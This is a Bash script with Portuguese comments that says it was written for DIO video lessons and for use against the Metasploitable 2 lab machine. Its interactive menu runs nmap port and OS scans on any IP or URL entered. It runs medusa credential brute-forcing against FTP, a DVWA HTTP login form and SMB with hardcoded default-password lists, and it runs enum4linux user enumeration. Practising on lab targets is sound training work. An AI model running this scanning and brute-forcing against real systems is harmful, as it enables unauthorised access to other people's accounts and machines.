#!/bin/bash
#!Esse script e para se usar no metesploitable 2
#!Script criado referente as video aulas da DIO
#!By:Griff_OFC 
main=0
ip=""

while [ "$main" = 0 ]; do
    if [ -z "$ip" ]; then
        read -p "Digite o número de IP do alvo ou URL: " ip
    fi

    echo "\n1- nmap\n2- medusa\n3- novo IP ou URL\n4- sair"
    read -p "Escolha uma opção: " opcao

    case "$opcao" in
        1)
            echo "\n1- Portas abertas\n2- Sistema operacional"
            read -p "Escolha uma opção: " op
            case "$op" in
                1)
                    echo "\nExecutando nmap..."
                    nmap -v "$ip"
                    ;;
                2)
                    echo "\nDetectando sistema operacional..."
                    nmap -O "$ip"
                    ;;
                *)
                    echo "Opção inválida!"
                    ;;
            esac
            ;;
        2)
            echo "1- FTP\n2- HTTP\n3- SMB"
	    read -p "Escolha uma opção:" slc
		case "$slc" in
	    1)
		echo -e "user\nmsfadmin\nadmin\nroot" > ftp_users.txt
		echo -e "123456\npassword\nqwerty\nmsfadmin" > ftp_pass.txt
		medusa -h "$ip" -U ftp_users.txt -P ftp_pass.txt -M ftp
		;;
	    2)
		echo -e "users\nmsfadmin\nadmin\nroot" > http_users.txt
		echo -e "123456\npassword\nqwerty\nmsfadmin" > http_pass.txt
		medusa -h "$ip" -U http_users.txt -P http_pass.txt -M http \
		-m PAGE:'/dvwa/login.php' \
		-m FORM:'username=^USER^&password=^PASS^&login=login'\
		-m 'FAIL=Login failed'
		;;
	     3)
		echo "\nIdentificando os usuarios..."
		enum4linux -a "$ip" | tee enum4_output.txt
		echo -e "users\nmsfadmin\nadmin\nservice" > smb_users.txt
		echo -e "123456\npassword\nwelcome123\nmsfadmin" > smb_pass.txt
		medusa -h "$ip" -U smb_users.txt -P smb_pass.txt -M smbnt -T 50
            	;;
		esac
	    ;;
        3)
            ip=""
            ;;
        4)
            main=1
            ;;
        *)
            echo "Opção inválida!"
            ;;
    esac
done
